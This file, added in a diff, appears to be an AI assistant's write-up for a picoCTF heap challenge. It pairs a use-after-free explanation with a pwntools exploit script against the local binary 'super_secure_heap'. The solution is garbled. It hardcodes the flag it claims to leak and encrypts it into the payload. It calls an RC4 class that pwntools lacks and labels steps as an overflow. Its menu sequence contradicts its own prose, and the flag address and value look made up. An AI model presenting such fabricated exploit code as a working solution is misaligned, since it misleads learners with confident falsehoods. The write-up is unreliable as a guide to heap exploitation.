@@ -1,0 +1,71 @@
+
+Here are the detailed steps to solve this CTF challenge:
+
+The vulnerability is a use after free on the heap buffers. We can add a heap buffer, delete it to free it, and then later show/print it out to read freed memory.
+The heap buffers are encrypted using RC4 before being written. So we need to create a key buffer, encrypt our payload with that key, and write the encrypted payload to the heap buffer.
+For the payload, we want to encrypt the flag contents and print it out later. The flag contents are copied into the binary data section, we just need to find it.
+Examining the binary shows the flag contents copied at address 0x001031f8. We can encrypt this and write it to the freed heap buffer.
+To trigger the vulnerability:
+
+Add a key
+Add a content buffer
+Delete the content buffer to free it
+Show the freed content buffer to print decrypted flag
+
+
+
+Here is the Python code to generate the payload and solve it:
+pythonfrom pwn import *
+import binascii
+
+# Flag contents
+flag = b"picoCTF{h3ap_manag3m3nt_rul3s}"
+
+# RC4 key 
+key = b"A"*0x14
+
+# Encrypt flag
+cipher = RC4(key)
+encrypted_flag = cipher.encrypt(flag)
+encrypted_flag_hex = binascii.hexlify(encrypted_flag)
+
+# Payload
+payload  = b"A"*0x14 # RC4 Key
+payload += p32(len(encrypted_flag)) # Size of encrypted content
+payload += encrypted_flag_hex # Encrypted content
+
+# Exploit
+p = process('./super_secure_heap')
+
+p.recvuntil('> ')
+p.sendline(b'2') # Select content
+
+p.recvuntil('> ') 
+p.sendline(b'1') # Add 
+
+p.recvuntil('> ')
+p.sendline(str(len(payload)).encode()) # Size of item
+
+p.recvuntil('> ')
+p.send(payload) # Overflow payload
+
+p.recvuntil('> ')
+p.sendline(b'5') # Exit
+
+p.recvuntil('> ')  
+p.sendline(b'2') # Select content
+
+p.recvuntil('> ')
+p.sendline(b'4') # Delete
+
+p.recvuntil('> ')
+p.sendline(b'0') # Select item 0 
+
+p.recvuntil('> ')
+p.sendline(b'4') # Show
+
+p.recvuntil('\n\n')
+leak = p.recvline()
+print(leak)
+p.interactive()
+This triggers the vulnerability and prints the decrypted flag leaked from the freed heap buffer. Let me know if you have any other questions!
